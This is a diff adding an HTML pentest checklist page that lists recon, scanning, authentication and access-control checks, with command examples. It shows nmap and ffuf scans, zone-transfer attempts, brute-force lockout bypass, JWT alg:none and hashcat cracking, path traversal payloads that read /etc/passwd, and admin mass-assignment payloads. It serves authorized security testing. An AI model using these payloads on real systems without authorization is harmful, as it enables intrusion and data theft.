@@ -1,0 +1,1280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RedOps — Manual Web Pentest Checklist</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Syne:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #060810;
+  --bg2: #0c0f1a;
+  --bg3: #111525;
+  --bg4: #161b2e;
+  --border: rgba(255,255,255,0.07);
+  --border2: rgba(255,255,255,0.12);
+  --red: #ff3b5c;
+  --red2: #ff6b7a;
+  --cyan: #00e5ff;
+  --cyan2: #4df5ff;
+  --green: #00ff88;
+  --amber: #ffb800;
+  --purple: #a855f7;
+  --text: #e8eaf0;
+  --muted: #6b7280;
+  --muted2: #9ca3af;
+  --font-mono: 'JetBrains Mono', monospace;
+  --font-sans: 'Syne', sans-serif;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--font-mono);
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* ── GRID LINES BACKGROUND ── */
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background-image:
+    linear-gradient(rgba(0,229,255,0.03) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0,229,255,0.03) 1px, transparent 1px);
+  background-size: 40px 40px;
+  pointer-events: none;
+  z-index: 0;
+}
+
+/* ── SCANLINE ── */
+body::after {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background: repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    rgba(0,0,0,0.08) 2px,
+    rgba(0,0,0,0.08) 4px
+  );
+  pointer-events: none;
+  z-index: 0;
+}
+
+.wrapper { position: relative; z-index: 1; max-width: 1200px; margin: 0 auto; padding: 0 24px; }
+
+/* ── TOPBAR ── */
+.topbar {
+  border-bottom: 1px solid var(--border);
+  background: rgba(6,8,16,0.9);
+  backdrop-filter: blur(12px);
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+.topbar-inner {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  padding: 12px 24px;
+  max-width: 1200px;
+  margin: 0 auto;
+}
+.logo {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-family: var(--font-sans);
+  font-weight: 800;
+  font-size: 18px;
+  letter-spacing: -0.5px;
+}
+.logo-icon {
+  width: 32px; height: 32px;
+  background: linear-gradient(135deg, var(--red), var(--purple));
+  border-radius: 8px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 16px;
+}
+.logo span { color: var(--red); }
+.topbar-right { margin-left: auto; display: flex; align-items: center; gap: 12px; }
+.pill {
+  font-size: 11px;
+  font-family: var(--font-mono);
+  padding: 3px 10px;
+  border-radius: 99px;
+  border: 1px solid var(--border2);
+  color: var(--muted2);
+}
+.pill.live { border-color: rgba(0,255,136,0.3); color: var(--green); }
+.pill.live::before { content: '● '; font-size: 8px; }
+
+/* ── HERO ── */
+.hero {
+  padding: 64px 0 40px;
+  position: relative;
+}
+.hero-label {
+  font-size: 11px;
+  letter-spacing: 3px;
+  color: var(--cyan);
+  margin-bottom: 16px;
+  text-transform: uppercase;
+}
+.hero h1 {
+  font-family: var(--font-sans);
+  font-size: clamp(36px, 5vw, 64px);
+  font-weight: 800;
+  line-height: 1.05;
+  letter-spacing: -2px;
+  margin-bottom: 16px;
+}
+.hero h1 .accent { color: var(--red); }
+.hero h1 .dim { color: var(--muted); }
+.hero-sub {
+  font-size: 13px;
+  color: var(--muted2);
+  max-width: 520px;
+  line-height: 1.7;
+  margin-bottom: 32px;
+}
+.hero-meta {
+  display: flex;
+  gap: 24px;
+  flex-wrap: wrap;
+  margin-bottom: 40px;
+}
+.meta-item {
+  display: flex;
+  flex-direction: column;
+  gap: 2px;
+}
+.meta-label { font-size: 10px; letter-spacing: 2px; color: var(--muted); text-transform: uppercase; }
+.meta-value { font-size: 20px; font-weight: 700; font-family: var(--font-sans); }
+.meta-value.red { color: var(--red); }
+.meta-value.cyan { color: var(--cyan); }
+.meta-value.green { color: var(--green); }
+
+/* ── GLOBAL PROGRESS ── */
+.global-progress {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 20px 24px;
+  margin-bottom: 40px;
+  display: flex;
+  align-items: center;
+  gap: 20px;
+  flex-wrap: wrap;
+}
+.progress-text { font-size: 12px; color: var(--muted2); min-width: 120px; }
+.progress-text strong { color: var(--text); font-size: 14px; }
+.progress-track {
+  flex: 1;
+  min-width: 200px;
+  height: 6px;
+  background: var(--bg4);
+  border-radius: 99px;
+  overflow: hidden;
+}
+.progress-fill {
+  height: 100%;
+  background: linear-gradient(90deg, var(--red), var(--purple), var(--cyan));
+  border-radius: 99px;
+  transition: width 0.4s cubic-bezier(0.4,0,0.2,1);
+  width: 0%;
+}
+.progress-pct { font-size: 13px; font-weight: 600; color: var(--cyan); min-width: 36px; text-align: right; }
+
+/* ── TOOLBAR ── */
+.toolbar {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+  margin-bottom: 32px;
+  align-items: center;
+}
+.btn {
+  font-family: var(--font-mono);
+  font-size: 11px;
+  padding: 7px 14px;
+  border-radius: 6px;
+  border: 1px solid var(--border2);
+  background: var(--bg2);
+  color: var(--muted2);
+  cursor: pointer;
+  transition: all 0.15s;
+  letter-spacing: 0.5px;
+}
+.btn:hover { background: var(--bg3); border-color: var(--border2); color: var(--text); }
+.btn.danger { border-color: rgba(255,59,92,0.3); color: var(--red2); }
+.btn.danger:hover { background: rgba(255,59,92,0.1); }
+.btn.primary { background: var(--red); border-color: var(--red); color: #fff; font-weight: 600; }
+.btn.primary:hover { background: var(--red2); }
+.search-wrap { position: relative; margin-left: auto; }
+.search-wrap input {
+  font-family: var(--font-mono);
+  font-size: 12px;
+  background: var(--bg2);
+  border: 1px solid var(--border2);
+  border-radius: 6px;
+  color: var(--text);
+  padding: 7px 12px 7px 32px;
+  outline: none;
+  width: 200px;
+  transition: border-color 0.15s;
+}
+.search-wrap input:focus { border-color: var(--cyan); }
+.search-icon {
+  position: absolute;
+  left: 10px;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 12px;
+  color: var(--muted);
+  pointer-events: none;
+}
+
+/* ── PHASE CARDS ── */
+.phases { display: flex; flex-direction: column; gap: 12px; margin-bottom: 80px; }
+
+.phase-card {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  overflow: hidden;
+  transition: border-color 0.2s;
+}
+.phase-card:hover { border-color: var(--border2); }
+.phase-card.open { border-color: var(--border2); }
+
+.phase-header {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  padding: 16px 20px;
+  cursor: pointer;
+  user-select: none;
+  position: relative;
+}
+.phase-header::before {
+  content: '';
+  position: absolute;
+  left: 0; top: 0; bottom: 0;
+  width: 3px;
+  border-radius: 0 2px 2px 0;
+  background: var(--phase-color, var(--muted));
+  opacity: 0.7;
+}
+.phase-card.open .phase-header::before { opacity: 1; }
+
+.phase-num {
+  font-size: 10px;
+  font-weight: 700;
+  color: var(--muted);
+  min-width: 20px;
+  letter-spacing: 1px;
+}
+.phase-icon {
+  width: 32px; height: 32px;
+  border-radius: 8px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 15px;
+  flex-shrink: 0;
+  background: var(--phase-bg, rgba(255,255,255,0.05));
+}
+.phase-info { flex: 1; min-width: 0; }
+.phase-name {
+  font-family: var(--font-sans);
+  font-size: 14px;
+  font-weight: 600;
+  margin-bottom: 2px;
+}
+.phase-desc { font-size: 10px; color: var(--muted); line-height: 1.4; }
+.phase-stats { display: flex; align-items: center; gap: 12px; flex-shrink: 0; }
+.phase-bar-wrap { width: 60px; height: 4px; background: var(--bg4); border-radius: 99px; overflow: hidden; }
+.phase-bar { height: 100%; border-radius: 99px; transition: width 0.3s; width: 0%; background: var(--phase-color, var(--muted)); }
+.phase-count { font-size: 11px; color: var(--muted2); min-width: 32px; text-align: right; }
+.phase-toggle {
+  font-size: 12px;
+  color: var(--muted);
+  transition: transform 0.2s;
+}
+.phase-card.open .phase-toggle { transform: rotate(180deg); }
+
+/* ── PHASE BODY ── */
+.phase-body { display: none; border-top: 1px solid var(--border); }
+.phase-card.open .phase-body { display: block; }
+
+.tabs {
+  display: flex;
+  border-bottom: 1px solid var(--border);
+  padding: 0 20px;
+}
+.tab {
+  font-size: 11px;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+  padding: 10px 14px;
+  cursor: pointer;
+  color: var(--muted);
+  border-bottom: 2px solid transparent;
+  margin-bottom: -1px;
+  transition: all 0.15s;
+  background: none;
+  border-left: none;
+  border-right: none;
+  border-top: none;
+  font-family: var(--font-mono);
+}
+.tab:hover { color: var(--text); }
+.tab.active { color: var(--phase-color, var(--cyan)); border-bottom-color: var(--phase-color, var(--cyan)); }
+
+.tab-content { display: none; }
+.tab-content.active { display: block; }
+
+/* Checklist */
+.checklist-wrap { padding: 16px 20px; }
+.check-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  padding: 9px 10px;
+  border-radius: 6px;
+  transition: background 0.1s;
+  cursor: pointer;
+}
+.check-item:hover { background: var(--bg3); }
+.check-item input[type=checkbox] {
+  width: 15px; height: 15px;
+  flex-shrink: 0;
+  margin-top: 2px;
+  accent-color: var(--phase-color, var(--cyan));
+  cursor: pointer;
+}
+.check-body { flex: 1; }
+.check-title {
+  font-size: 12px;
+  color: var(--text);
+  line-height: 1.5;
+  transition: color 0.15s;
+}
+.check-item.done .check-title { color: var(--muted); text-decoration: line-through; }
+.check-note { font-size: 11px; color: var(--muted); margin-top: 2px; line-height: 1.5; }
+.sev {
+  font-size: 9px;
+  font-weight: 700;
+  padding: 2px 7px;
+  border-radius: 4px;
+  letter-spacing: 1px;
+  flex-shrink: 0;
+  margin-top: 2px;
+}
+.sev-HIGH { background: rgba(255,59,92,0.15); color: var(--red2); border: 1px solid rgba(255,59,92,0.3); }
+.sev-MED { background: rgba(255,184,0,0.12); color: var(--amber); border: 1px solid rgba(255,184,0,0.25); }
+.sev-INFO { background: rgba(0,229,255,0.08); color: var(--cyan); border: 1px solid rgba(0,229,255,0.2); }
+
+/* Methodology */
+.method-wrap { padding: 20px 24px; }
+.method-wrap h3 {
+  font-family: var(--font-sans);
+  font-size: 13px;
+  font-weight: 700;
+  color: var(--phase-color, var(--cyan));
+  margin-bottom: 6px;
+  letter-spacing: -0.3px;
+}
+.method-wrap p {
+  font-size: 12px;
+  color: var(--muted2);
+  line-height: 1.8;
+  margin-bottom: 16px;
+}
+.method-wrap ul { margin-bottom: 16px; padding-left: 0; list-style: none; }
+.method-wrap ul li {
+  font-size: 12px;
+  color: var(--muted2);
+  padding: 4px 0 4px 16px;
+  position: relative;
+  line-height: 1.7;
+}
+.method-wrap ul li::before {
+  content: '›';
+  position: absolute;
+  left: 0;
+  color: var(--phase-color, var(--cyan));
+  font-weight: 700;
+}
+.code-block {
+  background: var(--bg);
+  border: 1px solid var(--border2);
+  border-radius: 8px;
+  padding: 14px 16px;
+  margin: 10px 0 18px;
+  overflow-x: auto;
+  position: relative;
+}
+.code-block code {
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--green);
+  line-height: 1.8;
+  white-space: pre;
+  display: block;
+}
+.code-block .comment { color: var(--muted); }
+.code-block .cmd { color: var(--cyan2); }
+.code-block .flag { color: var(--amber); }
+.code-block .str { color: var(--red2); }
+.copy-btn {
+  position: absolute;
+  top: 8px; right: 8px;
+  font-size: 10px;
+  font-family: var(--font-mono);
+  background: var(--bg3);
+  border: 1px solid var(--border2);
+  color: var(--muted2);
+  padding: 3px 8px;
+  border-radius: 4px;
+  cursor: pointer;
+  transition: all 0.15s;
+}
+.copy-btn:hover { color: var(--text); background: var(--bg4); }
+.tip-box {
+  background: rgba(0,229,255,0.05);
+  border: 1px solid rgba(0,229,255,0.15);
+  border-radius: 8px;
+  padding: 12px 14px;
+  margin: 10px 0 18px;
+  font-size: 11px;
+  color: var(--cyan2);
+  line-height: 1.7;
+}
+.tip-box::before { content: '⚡ TIP: '; font-weight: 700; }
+.warn-box {
+  background: rgba(255,184,0,0.06);
+  border: 1px solid rgba(255,184,0,0.2);
+  border-radius: 8px;
+  padding: 12px 14px;
+  margin: 10px 0 18px;
+  font-size: 11px;
+  color: var(--amber);
+  line-height: 1.7;
+}
+.warn-box::before { content: '⚠ NOTE: '; font-weight: 700; }
+.section-divider {
+  border: none;
+  border-top: 1px solid var(--border);
+  margin: 20px 0;
+}
+
+/* ── FOOTER ── */
+footer {
+  border-top: 1px solid var(--border);
+  padding: 24px;
+  text-align: center;
+  font-size: 11px;
+  color: var(--muted);
+}
+footer span { color: var(--red2); }
+
+/* ── ANIMATIONS ── */
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(6px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+.phase-card { animation: fadeIn 0.3s ease both; }
+.phase-card:nth-child(1) { animation-delay: 0.02s }
+.phase-card:nth-child(2) { animation-delay: 0.04s }
+.phase-card:nth-child(3) { animation-delay: 0.06s }
+.phase-card:nth-child(4) { animation-delay: 0.08s }
+.phase-card:nth-child(5) { animation-delay: 0.10s }
+.phase-card:nth-child(6) { animation-delay: 0.12s }
+.phase-card:nth-child(7) { animation-delay: 0.14s }
+.phase-card:nth-child(8) { animation-delay: 0.16s }
+.phase-card:nth-child(9) { animation-delay: 0.18s }
+.phase-card:nth-child(10) { animation-delay: 0.20s }
+
+/* ── RESPONSIVE ── */
+@media(max-width:600px){
+  .hero h1 { font-size: 32px; }
+  .toolbar { gap: 6px; }
+  .search-wrap { margin-left: 0; width: 100%; }
+  .search-wrap input { width: 100%; }
+  .phase-desc { display: none; }
+}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="logo">
+      <div class="logo-icon">⚔</div>
+      Red<span>Ops</span>
+    </div>
+    <div class="topbar-right">
+      <span class="pill">OWASP Top 10</span>
+      <span class="pill">v2.0</span>
+      <span class="pill live" id="live-count">0 / 87 done</span>
+    </div>
+  </div>
+</div>
+
+<div class="wrapper">
+  <div class="hero">
+    <div class="hero-label">// internal red team operations</div>
+    <h1>Manual Web<br><span class="accent">Pentest</span> <span class="dim">Checklist</span></h1>
+    <p class="hero-sub">Comprehensive OWASP-aligned methodology for authorized internal web application penetration testing. 9 phases, 87 checks, full command references.</p>
+    <div class="hero-meta">
+      <div class="meta-item">
+        <span class="meta-label">Total Checks</span>
+        <span class="meta-value cyan">87</span>
+      </div>
+      <div class="meta-item">
+        <span class="meta-label">Phases</span>
+        <span class="meta-value red">09</span>
+      </div>
+      <div class="meta-item">
+        <span class="meta-label">Completed</span>
+        <span class="meta-value green" id="hero-done">0</span>
+      </div>
+      <div class="meta-item">
+        <span class="meta-label">Critical Checks</span>
+        <span class="meta-value red">54</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="global-progress">
+    <div class="progress-text">Overall progress<br><strong id="prog-label">0 of 87 checks</strong></div>
+    <div class="progress-track"><div class="progress-fill" id="prog-fill"></div></div>
+    <div class="progress-pct" id="prog-pct">0%</div>
+  </div>
+
+  <div class="toolbar">
+    <button class="btn" onclick="expandAll()">▼ Expand All</button>
+    <button class="btn" onclick="collapseAll()">▲ Collapse All</button>
+    <button class="btn danger" onclick="resetAll()">↺ Reset</button>
+    <button class="btn primary" onclick="exportReport()">⬇ Export Report</button>
+    <div class="search-wrap">
+      <span class="search-icon">⌕</span>
+      <input type="text" placeholder="Search checks..." id="search" oninput="filterChecks(this.value)">
+    </div>
+  </div>
+
+  <div class="phases" id="phases-container"></div>
+</div>
+
+<footer>RedOps Pentest Checklist &mdash; For authorized use only &mdash; Built by <span>Cyber-Bot</span></footer>
+
+<script>
+const PHASES = [
+  {
+    id:'recon',
+    num:'01',
+    name:'Recon & Information Gathering',
+    desc:'Passive & active surface mapping',
+    icon:'🌐',
+    color:'#00e5ff',
+    bg:'rgba(0,229,255,0.08)',
+    checks:[
+      {t:'WHOIS lookup and DNS record enumeration (A, MX, TXT, CNAME, NS)',s:'MED',n:'Check for zone transfer: dig axfr @ns1.target.com target.com'},
+      {t:'Subdomain enumeration via subfinder, amass, dnsx, crt.sh',s:'HIGH',n:'Cross-validate with cert transparency logs'},
+      {t:'Identify IP ranges, ASN, and hosting providers',s:'INFO',n:'Use bgp.he.net or ipinfo.io'},
+      {t:'Shodan / Censys / FOFA passive asset discovery',s:'MED',n:'Search hostname:target.com and org:"Company Name"'},
+      {t:'Google dorks: site:, filetype:, inurl:, intitle:, ext:env',s:'HIGH',n:'Try: site:target.com ext:log OR ext:bak OR ext:env'},
+      {t:'Wayback Machine / GAU endpoint harvesting',s:'MED',n:'gau target.com | grep -E "\\.(php|asp|js|json)"'},
+      {t:'Technology fingerprinting with WhatWeb / Wappalyzer',s:'INFO',n:'Note CMS version, frameworks, server banners'},
+      {t:'Email harvesting via theHarvester or hunter.io',s:'INFO',n:'For phishing surface awareness'},
+      {t:'GitHub dorking for exposed secrets, configs, API keys',s:'HIGH',n:'Search: org:target password OR apikey OR secret'},
+      {t:'LinkedIn employee enumeration for org structure',s:'INFO',n:'Identifies tech stack from job descriptions'},
+    ],
+    method:`<h3>Objective</h3>
+<p>Build a complete picture of the target attack surface without touching the application. Passive recon leaves no server-side traces.</p>
+<h3>Step 1 — DNS Enumeration</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Basic DNS records</span>
+<span class="cmd">dig</span> <span class="flag">any</span> target.com
+<span class="cmd">whois</span> target.com
+
+<span class="comment"># Zone transfer attempt (often misconfigured)</span>
+<span class="cmd">dig</span> <span class="flag">axfr</span> @ns1.target.com target.com
+
+<span class="comment"># Subdomain brute-force + alive check</span>
+<span class="cmd">subfinder</span> <span class="flag">-d</span> target.com <span class="flag">-silent</span> | <span class="cmd">httpx</span> <span class="flag">-silent</span> <span class="flag">-status-code</span></code></div>
+<h3>Step 2 — Certificate Transparency</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># crt.sh passive subdomain discovery</span>
+<span class="cmd">curl</span> <span class="str">"https://crt.sh/?q=%25.target.com&output=json"</span> | jq '.[].name_value' | sort -u
+
+<span class="comment"># Amass for deep passive recon</span>
+<span class="cmd">amass</span> enum <span class="flag">-passive</span> <span class="flag">-d</span> target.com <span class="flag">-o</span> subdomains.txt</code></div>
+<h3>Step 3 — Google Dorks</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># High-value dorks</span>
+site:target.com filetype:pdf OR filetype:xls OR filetype:doc
+site:target.com inurl:admin OR inurl:login OR inurl:dashboard
+site:target.com "index of /"
+site:target.com ext:env OR ext:log OR ext:bak OR ext:cfg
+<span class="str">"target.com"</span> password OR secret OR api_key</code></div>
+<h3>Step 4 — Historical Endpoints</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># GAU — fetch all known URLs</span>
+<span class="cmd">gau</span> target.com | grep <span class="flag">-E</span> <span class="str">"\\.(php|asp|aspx|jsp|cgi)"</span> | sort -u
+
+<span class="comment"># Waybackurls</span>
+<span class="cmd">waybackurls</span> target.com | <span class="cmd">tee</span> wayback.txt</code></div>
+<div class="tip-box">Combine subfinder output with httpx probe to get a live subdomain list before moving to Phase 2.</div>`
+  },
+  {
+    id:'scan',
+    num:'02',
+    name:'Scanning & Enumeration',
+    desc:'Port mapping, directory discovery, tech fingerprinting',
+    icon:'📡',
+    color:'#00ff88',
+    bg:'rgba(0,255,136,0.07)',
+    checks:[
+      {t:'Full TCP port scan with service version detection',s:'HIGH',n:'nmap -sV -sC -p- --min-rate 3000 target.com'},
+      {t:'UDP scan on common ports (53, 161, 500)',s:'MED',n:'nmap -sU --top-ports 100 target.com'},
+      {t:'Directory and path fuzzing with ffuf / gobuster',s:'HIGH',n:'Use SecLists raft-medium-directories.txt'},
+      {t:'Parameter discovery and fuzzing',s:'HIGH',n:'ffuf -u "https://target.com/page?FUZZ=test" -w params.txt'},
+      {t:'Virtual host enumeration',s:'MED',n:'Fuzz Host header with ffuf -H "Host: FUZZ.target.com"'},
+      {t:'API endpoint discovery (/api/, /v1/, swagger.json, openapi)',s:'HIGH',n:'Check /api-docs, /swagger-ui.html, /.well-known/'},
+      {t:'robots.txt, sitemap.xml, .well-known review',s:'MED',n:'Also check /crossdomain.xml, /clientaccesspolicy.xml'},
+      {t:'Nikto / WhatWeb automated scan',s:'MED',n:'nikto -h target.com -output nikto.txt'},
+      {t:'SSL/TLS configuration audit',s:'MED',n:'testssl.sh --severity MEDIUM target.com'},
+      {t:'Backup and sensitive file enumeration',s:'HIGH',n:'Try .bak .old ~ .swp .git/HEAD /.env /config.php.bak'},
+    ],
+    method:`<h3>Objective</h3>
+<p>Map every open port, endpoint, and file path. Automation finds breadth; manual review finds depth.</p>
+<h3>Step 1 — Nmap Port Scan</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Full TCP scan — save output in all formats</span>
+<span class="cmd">nmap</span> <span class="flag">-sV -sC -p-</span> --min-rate 3000 target.com <span class="flag">-oA</span> nmap_full
+
+<span class="comment"># Quick common ports first</span>
+<span class="cmd">nmap</span> <span class="flag">-sV -sC</span> --top-ports 1000 target.com
+
+<span class="comment"># UDP scan</span>
+<span class="cmd">sudo nmap</span> <span class="flag">-sU</span> --top-ports 100 target.com</code></div>
+<h3>Step 2 — Directory Fuzzing</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Fast directory fuzzing with ffuf</span>
+<span class="cmd">ffuf</span> <span class="flag">-u</span> https://target.com/FUZZ \
+  <span class="flag">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+  <span class="flag">-mc</span> 200,301,302,403 \
+  <span class="flag">-t</span> 50 <span class="flag">-o</span> dirs.json
+
+<span class="comment"># Recursive fuzzing on found paths</span>
+<span class="cmd">feroxbuster</span> <span class="flag">-u</span> https://target.com <span class="flag">-w</span> wordlist.txt <span class="flag">--depth</span> 3</code></div>
+<h3>Step 3 — Backup Files</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Common sensitive files to check manually</span>
+/.git/HEAD
+/.env
+/.env.local
+/config.php.bak
+/web.config.bak
+/backup.zip
+/database.sql
+/phpinfo.php
+/server-status
+/server-info</code></div>
+<h3>Step 4 — SSL Audit</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># testssl.sh — comprehensive TLS check</span>
+<span class="cmd">testssl.sh</span> <span class="flag">--severity MEDIUM</span> --quiet target.com
+
+<span class="comment"># Check specific vulnerabilities</span>
+<span class="cmd">testssl.sh</span> <span class="flag">--heartbleed --beast --poodle</span> target.com</code></div>
+<div class="warn-box">Always filter ffuf results by response size (-fs) to remove false positives from WAF catch-all pages.</div>`
+  },
+  {
+    id:'auth',
+    num:'03',
+    name:'Authentication & Session',
+    desc:'Login flows, JWT, session tokens, MFA',
+    icon:'🔐',
+    color:'#ffb800',
+    bg:'rgba(255,184,0,0.07)',
+    checks:[
+      {t:'Default or weak credential testing',s:'HIGH',n:'admin:admin, admin:password, test:test, root:root'},
+      {t:'Username enumeration via login and password reset responses',s:'HIGH',n:'Compare response size, time, and message differences'},
+      {t:'Brute force protection — lockout and CAPTCHA bypass',s:'HIGH',n:'Test with X-Forwarded-For spoofing to bypass IP blocks'},
+      {t:'Password reset token entropy and expiry testing',s:'HIGH',n:'Check if token is guessable, reusable, or never expires'},
+      {t:'Multi-factor authentication bypass techniques',s:'HIGH',n:'Response manipulation, code reuse, backup code abuse'},
+      {t:'Session token entropy and predictability analysis',s:'HIGH',n:'Collect 20+ tokens, check for patterns or sequential values'},
+      {t:'Session fixation — pre-auth token reuse post-login',s:'HIGH',n:'Set session cookie before login, check if it persists'},
+      {t:'Session persistence after logout',s:'HIGH',n:'Copy cookie, logout, replay — should return 401/403'},
+      {t:'JWT: alg:none, HS256/RS256 confusion, weak secret crack',s:'HIGH',n:'hashcat -a 0 -m 16500 token.jwt rockyou.txt'},
+      {t:'OAuth misconfig: redirect_uri, state parameter, token leakage',s:'HIGH',n:'Test redirect_uri with open redirector'},
+      {t:'Cookie security flags: Secure, HttpOnly, SameSite',s:'MED',n:'Check in Burp response headers on Set-Cookie'},
+      {t:'Concurrent session limits and session isolation',s:'MED',n:'Open same account in two browsers simultaneously'},
+    ],
+    method:`<h3>Objective</h3>
+<p>Break authentication to gain unauthorized access. Focus on logic flaws over brute force — smarter attacks leave fewer logs.</p>
+<h3>JWT Attacks</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># 1. Decode JWT structure</span>
+<span class="cmd">echo</span> <span class="str">"eyJ..."</span> | base64 -d 2>/dev/null
+
+<span class="comment"># 2. alg:none attack — remove signature</span>
+<span class="comment"># Change header: {"alg":"none","typ":"JWT"}</span>
+<span class="comment"># Remove signature part (after last dot)</span>
+
+<span class="comment"># 3. Brute-force HS256 secret</span>
+<span class="cmd">hashcat</span> <span class="flag">-a 0 -m 16500</span> token.jwt /usr/share/wordlists/rockyou.txt
+
+<span class="comment"># 4. Use jwt_tool for automated attacks</span>
+<span class="cmd">python3 jwt_tool.py</span> TOKEN <span class="flag">-M at</span></code></div>
+<h3>Password Reset Token Analysis</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Collect multiple tokens for entropy analysis</span>
+1. Request reset for attacker@evil.com → capture token
+2. Request reset for attacker2@evil.com → capture token
+3. Compare tokens for sequential patterns
+
+<span class="comment"># Test token reuse</span>
+1. Use reset token to change password
+2. Replay the same token → should return error
+
+<span class="comment"># Test expiry</span>
+1. Request token, wait 1hr, try to use → should expire</code></div>
+<h3>Session Fixation PoC</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># In Burp — before login:</span>
+1. Intercept login GET request
+2. Note session ID in cookie
+3. Complete login
+4. Check if session ID changed
+
+<span class="comment"># Vulnerable: same session ID before and after login</span>
+<span class="comment"># Secure: new session ID issued on authentication</span></code></div>
+<div class="tip-box">Use Burp Sequencer to analyze session token randomness — collect 10,000 tokens and run FIPS analysis.</div>`
+  },
+  {
+    id:'authz',
+    num:'04',
+    name:'Authorization & Access Control',
+    desc:'IDOR, privilege escalation, path traversal',
+    icon:'🛡',
+    color:'#a855f7',
+    bg:'rgba(168,85,247,0.08)',
+    checks:[
+      {t:'IDOR — horizontal privilege escalation via object IDs',s:'HIGH',n:'Create two accounts, swap resource IDs between sessions'},
+      {t:'Vertical privilege escalation (user → admin)',s:'HIGH',n:'Browse /admin, /settings as low-priv user'},
+      {t:'Forced browsing to restricted endpoints',s:'HIGH',n:'Manually enumerate admin routes not linked in UI'},
+      {t:'Parameter tampering: role=admin, isAdmin=true, admin=1',s:'HIGH',n:'Intercept and modify in Burp Repeater'},
+      {t:'Mass assignment / auto-bind vulnerability',s:'HIGH',n:'POST extra JSON fields like "role":"admin" to registration'},
+      {t:'API authorization — test each endpoint with lower-priv token',s:'HIGH',n:'BOLA: swap user A token for user B resources'},
+      {t:'Function-level access control — admin actions as normal user',s:'HIGH',n:'Try admin API calls with regular user session'},
+      {t:'Path traversal with encoding bypass',s:'HIGH',n:'../etc/passwd | %2F..%2F | %252F | ....// variations'},
+    ],
+    method:`<h3>Objective</h3>
+<p>Access data or functionality beyond your authorization level. IDOR and broken access control are the #1 OWASP finding in real-world assessments.</p>
+<h3>IDOR Testing Methodology</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Setup: Two accounts in Burp</span>
+Account A (attacker): attacker@test.com
+Account B (victim):   victim@test.com
+
+<span class="comment"># Steps:</span>
+1. Log in as Account B, perform action (view order, profile, file)
+2. Capture request — note object ID (e.g. /api/orders/1042)
+3. Log in as Account A
+4. Replay request to /api/orders/1042 using Account A session
+5. If data returns — IDOR confirmed
+
+<span class="comment"># Automate with Burp Autorize extension</span></code></div>
+<h3>Path Traversal Payloads</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Basic</span>
+../../../etc/passwd
+..\\..\\..\\windows\\win.ini
+
+<span class="comment"># URL encoded</span>
+%2F..%2F..%2Fetc%2Fpasswd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+<span class="comment"># Double encoded</span>
+%252F..%252F..%252Fetc%252Fpasswd
+
+<span class="comment"># Null byte (PHP < 5.3)</span>
+../../../../etc/passwd%00.jpg</code></div>
+<h3>Mass Assignment Test</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Normal registration POST</span>
+{"username":"test","password":"Test123!","email":"t@t.com"}
+
+<span class="comment"># Mass assignment attempt</span>
+{
+  "username":"test",
+  "password":"Test123!",
+  "email":"t@t.com",
+  "role":"admin",
+  "isAdmin":true,
+  "privilege":9
+}</code></div>
+<div class="warn-box">Always test access control in both directions — not just lower-priv accessing higher-priv, but also cross-account horizontal access.</div>`
+  },
+  {
+    id:'inject',
+    num:'05',
+    name:'Input Validation & Injection',
+    desc:'SQLi, XSS, SSTI, SSRF, RCE, file upload',
+    icon:'💉',
+    color:'#ff3b5c',
+    bg:'rgba(255,59,92,0.07)',
+    checks:[
